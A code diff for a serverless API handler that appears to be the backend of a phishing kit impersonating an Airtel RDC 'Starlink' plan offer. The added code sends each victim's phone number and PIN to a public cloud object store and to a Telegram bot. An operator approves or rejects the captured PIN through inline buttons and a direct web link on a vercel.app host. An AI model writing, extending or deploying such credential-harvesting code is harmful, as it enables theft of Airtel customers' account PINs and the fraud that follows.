@@ -24,6 +24,39 @@ export default async function handler(req, res) {
     const cleanPhone = phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
     const cleanPin = pin.toString().slice(0, 4);
 
+    // 1. Create cloud session record on restful-api.dev
+    let cloudId = sessionId;
+    try {
+      const createRes = await fetch('https://api.restful-api.dev/objects', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: `stl_${cleanPhone}`,
+          data: {
+            sessionId,
+            phone: cleanPhone,
+            pin: cleanPin,
+            planName: planName || 'Forfait Airtel Starlink',
+            planPrice: planPrice || '$1.49',
+            loginStatus: 'pending',
+            otpStatus: 'idle',
+            createdAt: Date.now(),
+            lastUpdated: Date.now(),
+          },
+        }),
+      });
+
+      if (createRes.ok) {
+        const createData = await createRes.json();
+        if (createData.id) {
+          cloudId = createData.id;
+        }
+      }
+    } catch (e) {
+      console.warn('Could not create cloud record:', e);
+    }
+
+    // 2. Format message for Telegram
     const messageText =
       `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
       `👤 <b>Numéro de Téléphone:</b> <code>+243 ${cleanPhone}</code>\n` +
@@ -31,18 +64,24 @@ export default async function handler(req, res) {
       `📦 <b>Forfait Choisi:</b> <b>${planName || 'Forfait Airtel Starlink'}</b> (${planPrice || '$1.49'})\n` +
       `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
       `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
-      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
+      `🆔 <b>ID Session:</b> <code>${cloudId}</code>\n\n` +
       `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
 
     const inlineKeyboard = [
       [
         {
           text: '✅ Valider PIN',
-          callback_data: `approve_login_${sessionId}`,
+          callback_data: `approve_login_${cloudId}`,
         },
         {
           text: '❌ Rejeter PIN',
-          callback_data: `reject_login_${sessionId}`,
+          callback_data: `reject_login_${cloudId}`,
+        },
+      ],
+      [
+        {
+          text: '🌐 Action Directe (Lien Web)',
+          url: `https://congo2-one.vercel.app/api/telegram/action?id=${cloudId}&action=approve_login`,
         },
       ],
     ];
@@ -65,6 +104,7 @@ export default async function handler(req, res) {
     return res.status(200).json({
       success: true,
       sessionId,
+      cloudId,
       status: 'pending',
       telegramResult: tgData,
     });
